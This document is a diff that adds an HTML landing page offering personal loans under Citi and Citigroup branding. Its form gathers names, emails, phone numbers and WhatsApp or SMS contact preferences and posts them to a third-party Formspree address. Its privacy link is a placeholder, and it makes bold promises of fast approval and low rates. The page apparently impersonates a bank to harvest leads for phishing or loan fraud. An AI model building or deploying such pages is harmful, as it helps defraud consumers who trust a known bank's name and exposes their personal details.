@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Need a Personal Loan? Talk to Our Experts</title>
+
+  <style>
+  /******************************************************************
+   * Base tokens (merged from your global styles)
+   ******************************************************************/
+  :root{
+    /* From page */
+    --inquiry-primary: #255be3;
+    --inquiry-secondary: #0a62a9;
+    --inquiry-dark: #0f2b59;
+    --inquiry-success: #22c55e;
+    --inquiry-light: #f8fafc;
+    --inquiry-border: #e9edf2;
+    --inquiry-shadow: 0 12px 28px rgba(16,42,67,.12);
+
+    /* From your uploaded styles */
+    --divider:#e9edf2;
+    --brand:#0a62a9;
+    --muted:#6b7680;
+    --ink:#0f2b59;
+    --blue:#0a5aa8;
+
+    /* Header logo sizes (logo bigger, per request) */
+    --brand-logo-height: 78px;   /* was 64px */
+    --fdic-logo-height: 32px;    /* was 30px */
+  }
+
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    font-family:'Interstate','Helvetica Neue',Arial,sans-serif;
+    color:#30383d;
+    background:#fff;
+  }
+  .container{max-width:1200px;margin:0 auto;padding:0 20px;}
+
+  /******************************************************************
+   * HEADER LOGO + ICON SIZING
+   ******************************************************************/
+  .utility-bar{background:#fff;border-bottom:1px solid var(--divider);}
+  .utility-inner{display:flex;align-items:center;justify-content:space-between;padding:10px 0;}
+  .site-header .brand-left{display:flex;align-items:center;gap:14px;}
+  .site-header .citi-logo{height:var(--brand-logo-height);width:auto;display:block;}
+  .site-header .fdic-wrap{display:flex;align-items:center;}
+  .site-header .fdic-logo{height:var(--fdic-logo-height);width:auto;display:block;opacity:.95;}
+  .utility-actions{display:flex;align-items:center;gap:16px;}
+  .utility-link{display:inline-flex;align-items:center;gap:8px;text-decoration:none;color:#39434a;font-weight:700;}
+  .icon-img{width:20px;height:20px;display:inline-block;object-fit:contain;}
+
+  /******************************************************************
+   * HERO SECTION
+   ******************************************************************/
+  .inquiry-hero{
+    background: linear-gradient(135deg, var(--inquiry-primary) 0%, var(--inquiry-secondary) 100%);
+    color:#fff; padding:60px 0 80px; position:relative; overflow:hidden;
+  }
+  .inquiry-hero::before{
+    content:''; position:absolute; top:-50%; right:-20%; width:60%; height:200%;
+    background: radial-gradient(circle, rgba(255,255,255,0.06) 1px, transparent 1px);
+    background-size:40px 40px; opacity:.6; animation:float 25s linear infinite;
+  }
+  @keyframes float { 0%{transform:translateY(0) rotate(0)} 100%{transform:translateY(-80px) rotate(360deg)} }
+
+  .inquiry-hero-inner{
+    display:grid; grid-template-columns:1.2fr 0.8fr; gap:48px; align-items:start; position:relative; z-index:2;
+  }
+  .inquiry-hero-content{ padding-top:20px; }
+  .inquiry-kicker{
+    display:inline-block; background:rgba(255,255,255,.15); padding:10px 20px; border-radius:25px;
+    font-size:13px; font-weight:700; letter-spacing:.05em; text-transform:uppercase; margin-bottom:28px;
+    backdrop-filter:blur(10px); border:1px solid rgba(255,255,255,.2);
+  }
+  .inquiry-hero-title{ font-size:46px; line-height:1.15; font-weight:700; margin:0 0 24px; }
+  .inquiry-hero-subtitle{ font-size:22px; line-height:1.4; margin:0 0 36px; opacity:.95; font-weight:400; }
+  .inquiry-benefits-list{ list-style:none; margin:0; padding:0; }
+  .inquiry-benefits-list li{
+    display:flex; align-items:center; gap:14px; margin-bottom:16px; font-size:17px; font-weight:500;
+  }
+  .inquiry-benefits-list li::before{
+    content:'✓'; background:var(--inquiry-success); color:#fff; border-radius:50%;
+    width:24px; height:24px; display:flex; align-items:center; justify-content:center; font-size:14px; font-weight:700; flex-shrink:0;
+  }
+
+  /******************************************************************
+   * FORM CARD (re-styled with your design language)
+   * - Crisp white card, subtle border, soft shadow, rounded corners
+   ******************************************************************/
+  .inquiry-form-container{
+    background:#fff;
+    border:1px solid var(--divider);
+    border-radius:16px;
+    padding:32px 28px;
+    box-shadow: var(--inquiry-shadow);
+    position:relative;
+    width:100%;
+  }
+  .inquiry-form-header{text-align:center;margin-bottom:24px;}
+  .inquiry-form-title{font-size:24px;font-weight:700;color:var(--inquiry-dark);margin:0 0 6px;}
+  .inquiry-form-subtitle{font-size:14.5px;color:#6b7680;margin:0;}
+
+  /* Inputs styled like your forms.css controls (compact, clear borders) */
+  .inquiry-form{display:flex;flex-direction:column;gap:18px;}
+  .inquiry-form-row{display:grid;grid-template-columns:1fr 1fr;gap:18px;width:100%;}
+  .inquiry-form-group{position:relative;width:100%;}
+
+  .inquiry-label{
+    display:block; font-size:14px; font-weight:700; color:#435363; margin-bottom:6px;
+  }
+  .inquiry-input,
+  .inquiry-select,
+  .inquiry-textarea{
+    width:100%;
+    height:46px; /* aligns with --control-h */
+    padding:0 14px;
+    border:1px solid #ccd6de;              /* crisp control border from your styles */
+    border-radius:12px;                     /* tighter radius from your forms */
+    font-size:15px;
+    transition:border-color .15s, box-shadow .15s, background-color .15s;
+    background:#fff;
+  }
+  .inquiry-input:focus,
+  .inquiry-select:focus,
+  .inquiry-textarea:focus{
+    outline:none;
+    border-color:#a5b6c6;
+    box-shadow:0 0 0 3px rgba(10,90,168,.12);
+  }
+  .inquiry-textarea{ min-height:110px; height:auto; padding:12px 14px; resize:vertical; }
+
+  .inquiry-input.error,
+  .inquiry-select.error,
+  .inquiry-textarea.error{ border-color:#e1514a; box-shadow:inset 0 0 0 1px #e1514a; }
+
+  .inquiry-checkbox-group{ display:flex; align-items:flex-start; gap:12px; margin-top:6px; }
+  .inquiry-checkbox{ width:20px; height:20px; margin-top:2px; flex-shrink:0; }
+  .inquiry-checkbox-label{ font-size:14px; color:#556370; line-height:1.5; cursor:pointer; }
+  .inquiry-checkbox-label a{ color:var(--brand); text-decoration:underline; }
+
+  /* Primary submit (Citi-esque) */
+  .inquiry-submit{
+    width:100%; height:50px;
+    background: var(--blue);
+    color:#fff; border:1px solid #084b8f;
+    border-radius:12px; font-size:16px; font-weight:700; cursor:pointer;
+    transition: transform .02s ease, box-shadow .12s ease, background-color .12s ease;
+  }
+  .inquiry-submit:hover{ background:#094f98; box-shadow:0 8px 16px rgba(10,90,168,.18); }
+  .inquiry-submit:active{ transform:translateY(1px); }
+  .inquiry-submit.loading{ opacity:.9; cursor:not-allowed; }
+
+  /* What happens next note (subtle blue panel) */
+  .inquiry-contact-note{
+    background:#eef4fa; border:1px solid #d6e1ec; color:#213546;
+    border-radius:12px; padding:16px; margin-top:14px; font-size:14px; text-align:center;
+  }
+  .note-icon{ width:20px; height:20px; vertical-align:-4px; margin-right:6px; }
+
+  /* Inline errors */
+  .form-error{ color:#c23a2b; font-size:12.5px; margin-top:6px; display:none; }
+  .form-error.show{ display:block; }
+
+  /******************************************************************
+   * SUCCESS STATE (re-styled)
+   ******************************************************************/
+  .form-success{
+    background:#f6fbff;
+    border:1px solid #b7c6d5;
+    border-radius:16px;
+    padding:28px 22px;
+    text-align:center;
+    display:none;
+    box-shadow:0 12px 28px rgba(16,42,67,.08);
+  }
+  .form-success.show{ display:block; }
+  .form-success h3{
+    color:#0a5aa8; font-size:20px; margin:0 0 10px; display:inline-flex; align-items:center; gap:10px; font-weight:800;
+  }
+  .success-icon-wrap{
+    display:inline-grid; place-items:center; width:28px; height:28px; border-radius:999px; background:#0a5aa8;
+  }
+  .success-icon{ width:16px; height:16px; filter:brightness(0) invert(1); }
+  .form-success p{ color:#29557a; margin:0; font-size:15px; line-height:1.5; }
+
+  /******************************************************************
+   * BENEFITS SECTION
+   ******************************************************************/
+  .inquiry-benefits{ padding:80px 0; background:#fff; }
+  .inquiry-benefits-grid{
+    display:grid; grid-template-columns:repeat(auto-fit, minmax(280px,1fr));
+    gap:32px; margin-top:40px;
+  }
+  .inquiry-benefit-card{ text-align:center; padding:32px 24px; }
+  .inquiry-benefit-icon{
+    width:80px; height:80px;
+    background: linear-gradient(135deg, var(--inquiry-primary), var(--inquiry-secondary));
+    border-radius:50%; display:flex; align-items:center; justify-content:center;
+    margin:0 auto 18px;
+  }
+  .inquiry-benefit-icon img{
+    width:36px; height:36px; display:block;
+    /* Make icons white (requested) */
+    filter: brightness(0) invert(1);
+  }
+  .inquiry-benefit-title{ font-size:20px; font-weight:800; color:var(--inquiry-dark); margin:0 0 10px; }
+  .inquiry-benefit-text{ font-size:16px; color:#6b7680; line-height:1.6; margin:0; }
+
+  /******************************************************************
+   * FOOTER CTA
+   ******************************************************************/
+  .inquiry-footer-cta{ padding:80px 0; background:var(--inquiry-dark); color:#fff; text-align:center; }
+  .inquiry-footer-title{ font-size:34px; font-weight:800; margin:0 0 18px; }
+  .inquiry-footer-text{ font-size:17px; margin:0 0 26px; opacity:.95; max-width:600px; margin-left:auto; margin-right:auto; }
+  .inquiry-footer-btn{
+    display:inline-flex; align-items:center; gap:10px; padding:16px 30px; background:#fff; color:var(--inquiry-dark);
+    text-decoration:none; border-radius:14px; font-weight:800; font-size:15px; transition:transform .1s, box-shadow .12s;
+  }
+  .inquiry-footer-btn:hover{ transform:translateY(-2px); box-shadow:0 12px 32px rgba(255,255,255,.25); }
+
+  /******************************************************************
+   * SITE FOOTER (unchanged structure)
+   ******************************************************************/
+  .site-footer .footer-bottom{ padding:32px 0; text-align:center; }
+  .site-footer p{ margin:0; font-size:13px; opacity:.9; max-width:800px; margin:0 auto; }
+
+  /******************************************************************
+   * RESPONSIVE
+   ******************************************************************/
+  @media (max-width: 992px){
+    .inquiry-hero-inner{ grid-template-columns:1fr; gap:36px; text-align:center; }
+    .inquiry-hero-title{ font-size:38px; }
+    .inquiry-hero-subtitle{ font-size:20px; }
+    .inquiry-form-row{ grid-template-columns:1fr; gap:18px; }
+  }
+  @media (max-width: 768px){
+    .inquiry-hero{ padding:50px 0 70px; }
+    .inquiry-hero-title{ font-size:32px; line-height:1.2; }
+    .inquiry-hero-subtitle{ font-size:18px; }
+    .inquiry-form-container{ padding:24px 20px; border-radius:14px; }
+    .inquiry-form-title{ font-size:22px; }
+    .inquiry-submit{ height:50px; font-size:16px; }
+    .inquiry-benefits{ padding:60px 0; }
+    .inquiry-benefits-grid{ grid-template-columns:1fr; gap:28px; }
+    .inquiry-footer-cta{ padding:60px 0; }
+    .inquiry-footer-title{ font-size:28px; }
+    .inquiry-footer-text{ font-size:16px; }
+    .container{ padding:0 16px; }
+  }
+  @media (max-width: 480px){
+    .inquiry-hero{ padding:40px 0 60px; }
+    .inquiry-hero-title{ font-size:28px; }
+    .inquiry-hero-subtitle{ font-size:16px; }
+    .inquiry-kicker{ font-size:12px; padding:8px 16px; }
+    .inquiry-form-title{ font-size:20px; }
+    .inquiry-form-subtitle{ font-size:14px; }
+    .inquiry-submit{ height:50px; font-size:15px; }
+  }
+  </style>
+</head>
+<body>
+
+  <!-- ========= HEADER ========= -->
+  <header class="site-header">
+    <div class="utility-bar">
+      <div class="utility-inner container">
+        <div class="brand-left">
+          <img src="images/logodesign.svg" alt="Citi" class="citi-logo"/>
+        </div>
+        
+      </div>
+    </div>
+  </header>
+
+  <!-- ========= HERO WITH INQUIRY FORM ========= -->
+  <section class="inquiry-hero">
+    <div class="container">
+      <div class="inquiry-hero-inner">
+        <!-- Left: Value Proposition -->
+        <div class="inquiry-hero-content">
+          <div class="inquiry-kicker">Speak with a Loan Expert Today</div>
+          <h1 class="inquiry-hero-title">Get the Money You Need, Faster Than You Think</h1>
+          <p class="inquiry-hero-subtitle">Whether it's consolidating debt, home improvements, or unexpected expenses - our loan experts will find the perfect solution for your situation.</p>
+
+          <ul class="inquiry-benefits-list">
+            <li>Same-day pre-approval decisions</li>
+            <li>Rates as low as 5.99% APR</li>
+            <li>No hidden fees or surprises</li>
+            <li>Expert guidance every step of the way</li>
+          </ul>
+        </div>
+
+        <!-- Right: Inquiry Form -->
+        <div class="inquiry-form-container">
+          <div class="inquiry-form-header">
+            <h2 class="inquiry-form-title">Get Your Custom Quote</h2>
+            <p class="inquiry-form-subtitle">A loan specialist will call you within 2 hours</p>
+          </div>
+
+          <form class="inquiry-form" id="inquiryForm" action="https://formspree.io/f/mkgvddzw" method="POST">
+            <div class="inquiry-form-row">
+              <div class="inquiry-form-group">
+                <label class="inquiry-label" for="firstName">First Name</label>
+                <input type="text" class="inquiry-input" id="firstName" name="firstName" required>
+                <div class="form-error" id="firstNameError">Please enter your first name</div>
+              </div>
+              <div class="inquiry-form-group">
+                <label class="inquiry-label" for="lastName">Last Name</label>
+                <input type="text" class="inquiry-input" id="lastName" name="lastName" required>
+                <div class="form-error" id="lastNameError">Please enter your last name</div>
+              </div>
+            </div>
+
+            <div class="inquiry-form-group">
+              <label class="inquiry-label" for="email">Email Address</label>
+              <input type="email" class="inquiry-input" id="email" name="email" required>
+              <div class="form-error" id="emailError">Please enter a valid email address</div>
+            </div>
+
+            <div class="inquiry-form-group">
+              <label class="inquiry-label" for="phone">Phone Number</label>
+              <input type="tel" class="inquiry-input" id="phone" name="phone" required>
+              <div class="form-error" id="phoneError">Please enter a valid phone number</div>
+            </div>
+
+            <!-- NEW: Best method for contact -->
+            <div class="inquiry-form-group">
+              <label class="inquiry-label" for="contactMethod">Best method to reach you</label>
+              <select class="inquiry-select" id="contactMethod" name="contactMethod" required>
+                <option value="">Select a contact method</option>
+                <option value="phone_call">Phone call</option>
+                <option value="whatsapp">WhatsApp</option>
+                <option value="sms">SMS / Text</option>
+                <option value="email">Email</option>
+              </select>
+              <div class="form-error" id="contactMethodError">Please choose your preferred contact method</div>
+            </div>
+
+            <div class="inquiry-form-group">
+              <label class="inquiry-label" for="loanAmount">How much do you need?</label>
+              <select class="inquiry-select" id="loanAmount" name="loanAmount">
+                <option value="">Choose an amount</option>
+                <option value="5000-50000">$5,000 - $50,000</option>
+                <option value="50000+">$50,000+</option>
+                <option value="not-sure">I'm not sure yet</option>
+              </select>
+            </div>
+
+            <div class="inquiry-form-group">
+              <label class="inquiry-label" for="purpose">What's it for? (Optional)</label>
+              <select class="inquiry-select" id="purpose" name="purpose">
+                <option value="">Select purpose</option>
+                <option value="debt-consolidation">Pay off credit cards/debt</option>
+                <option value="home-improvement">Home renovation</option>
+                <option value="major-purchase">Major purchase</option>
+                <option value="medical">Medical expenses</option>
+                <option value="business">Business investment</option>
+                <option value="other">Something else</option>
+              </select>
+            </div>
+
+            <!-- Hidden tracking -->
+            <input type="hidden" name="source" value="loan-inquiry-landing-page">
+            <input type="hidden" name="timestamp" id="timestamp">
+            <input type="hidden" name="referrer" id="referrer">
+
+            <div class="inquiry-checkbox-group">
+              <input type="checkbox" class="inquiry-checkbox" id="consent" name="consent" required>
+              <label class="inquiry-checkbox-label" for="consent">
+                I agree to receive calls and texts from Citi about loan options. <a href="#" target="_blank">Privacy Policy</a>
+              </label>
+            </div>
+            <div class="form-error" id="consentError">Please agree to be contacted</div>
+
+            <button type="submit" class="inquiry-submit" id="submitBtn">
+              Get My Loan Options
+            </button>
+
+            <div class="inquiry-contact-note">
+              <img src="icon/chat.png" class="note-icon" alt="" aria-hidden="true">
+              <strong>What happens next?</strong> Our loan specialist will contact you within 2 hours to discuss your options and answer any questions. No pressure, no obligations.
+            </div>
+          </form>
+
+          <!-- Success State -->
+          <div class="form-success" id="successMessage">
+            <h3>
+              <span class="success-icon-wrap">
+                <img src="icon/check.svg" alt="" class="success-icon" aria-hidden="true">
+              </span>
+              Request Submitted Successfully!
+            </h3>
+            <p>Thank you! Our loan specialist will contact you within the next 2 hours to discuss your personalized loan options and answer any questions you have.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========= BENEFITS SECTION ========= -->
+  <section class="inquiry-benefits">
+    <div class="container">
+      <div style="text-align:center; margin-bottom: 10px;">
+        <h2 style="font-size: 34px; font-weight: 800; color: #0f2b59; margin: 0 0 10px; font-family: 'Interstate','Helvetica Neue',Arial,sans-serif;">
+          Why Thousands Choose Citi for Personal Loans
+        </h2>
+        <p style="font-size: 17px; color: #6b7680; margin: 0; max-width: 600px; margin: 0 auto;">We make getting a loan simple, fast, and transparent</p>
+      </div>
+
+      <div class="inquiry-benefits-grid">
+        <div class="inquiry-benefit-card">
+          <div class="inquiry-benefit-icon">
+            <img src="icon/fast-approval.png" alt="" aria-hidden="true">
+          </div>
+          <h3 class="inquiry-benefit-title">Lightning Fast Approval</h3>
+          <p class="inquiry-benefit-text">Get approved in minutes, not days. Most customers receive their funds within 24 hours of approval.</p>
+        </div>
+
+        <div class="inquiry-benefit-card">
+          <div class="inquiry-benefit-icon">
+            <img src="icon/competitive-rates.png" alt="" aria-hidden="true">
+          </div>
+          <h3 class="inquiry-benefit-title">Competitive Rates</h3>
+          <p class="inquiry-benefit-text">Rates starting at 5.99% APR with no origination fees, prepayment penalties, or hidden charges.</p>
+        </div>
+
+        <div class="inquiry-benefit-card">
+          <div class="inquiry-benefit-icon">
+            <img src="icon/personal-support.png" alt="" aria-hidden="true">
+          </div>
+          <h3 class="inquiry-benefit-title">Personal Support</h3>
+          <p class="inquiry-benefit-text">Work directly with experienced loan specialists who understand your unique financial situation.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========= FOOTER CTA ========= -->
+  <section class="inquiry-footer-cta">
+    <div class="container">
+      <h2 class="inquiry-footer-title">Ready to Take Control of Your Finances?</h2>
+      <p class="inquiry-footer-text">Stop waiting and start achieving your financial goals today. Our loan experts are standing by to help you find the perfect solution.</p>
+      <a href="#inquiryForm" class="inquiry-footer-btn">Talk to a Loan Expert Now</a>
+    </div>
+  </section>
+
+  <!-- ========= FOOTER ========= -->
+  <footer class="site-footer">
+    <div class="footer-bottom">
+      <div class="container">
+        <p>
+          © 2025 Citigroup Inc. All rights reserved. Member FDIC. Loans subject to credit approval.
+          Rates and terms vary based on creditworthiness, loan amount, and term.
+        </p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('inquiryForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const successMessage = document.getElementById('successMessage');
+
+    // Helpers
+    function validateField(fieldId, errorId, validator) {
+      const field = document.getElementById(fieldId);
+      const error = document.getElementById(errorId);
+      const ok = validator(field.value.trim());
+      if (!ok) { field.classList.add('error'); error.classList.add('show'); }
+      else { field.classList.remove('error'); error.classList.remove('show'); }
+      return ok;
+    }
+
+    // ✅ single backslashes
+    const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    const validatePhone = (phone) => phone.replace(/\D/g, '').length >= 10;
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const v1 = validateField('firstName','firstNameError', v => v.length > 0);
+      const v2 = validateField('lastName','lastNameError', v => v.length > 0);
+      const v3 = validateField('email','emailError', validateEmail);
+      const v4 = validateField('phone','phoneError', validatePhone);
+      const v5 = validateField('contactMethod','contactMethodError', v => v.length > 0);
+
+      const consent = document.getElementById('consent');
+      const consentError = document.getElementById('consentError');
+
+      let isValid = v1 && v2 && v3 && v4 && v5;
+      if (!consent.checked) { consentError.classList.add('show'); isValid = false; }
+      else { consentError.classList.remove('show'); }
+
+      if (isValid) {
+        submitBtn.classList.add('loading');
+        submitBtn.textContent = 'Submitting...';
+
+        document.getElementById('timestamp').value = new Date().toISOString();
+        document.getElementById('referrer').value = document.referrer || 'Direct';
+
+        const formData = new FormData(form);
+
+        fetch(form.action, { method:'POST', body:formData, headers:{ 'Accept':'application/json' }})
+          .then(response => {
+            if (response.ok) {
+              form.style.display = 'none';
+              successMessage.classList.add('show');
+              console.log('Lead successfully submitted to Formspree');
+            } else {
+              throw new Error('Form submission failed');
+            }
+          })
+          .catch(err => {
+            console.error('Error submitting form:', err);
+            submitBtn.classList.remove('loading');
+            submitBtn.textContent = 'Get My Loan Options';
+            alert('There was an error submitting your request. Please try again.');
+          });
+      }
+    });
+
+    // Real-time validation
+    ['firstName','lastName','email','phone','contactMethod'].forEach(id => {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.addEventListener('blur', function() {
+        const errorId = id + 'Error';
+        if (id === 'email') validateField(id, errorId, validateEmail);
+        else if (id === 'phone') validateField(id, errorId, validatePhone);
+        else validateField(id, errorId, v => v.trim().length > 0);
+      });
+    });
+
+    // Phone masking (✅ fixed backslashes)
+    document.getElementById('phone').addEventListener('input', function(e) {
+      let digits = e.target.value.replace(/\D/g, '');
+      if (digits.length > 10) digits = digits.slice(0, 10);
+      if (digits.length >= 6) {
+        e.target.value = digits.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
+      } else if (digits.length >= 3) {
+        e.target.value = digits.replace(/(\d{3})(\d{0,3})/, '($1) $2');
+      } else {
+        e.target.value = digits;
+      }
+    });
+
+    // Smooth scroll to form
+    document.querySelector('.inquiry-footer-btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.getElementById('inquiryForm').scrollIntoView({ behavior:'smooth', block:'start' });
+    });
+
+    // Auto-focus first field on mobile
+    if (window.innerWidth <= 768) {
+      setTimeout(() => { const f = document.getElementById('firstName'); if (f) f.focus(); }, 500);
+    }
+  });
+</script>
+
+
+</body>
+</html>
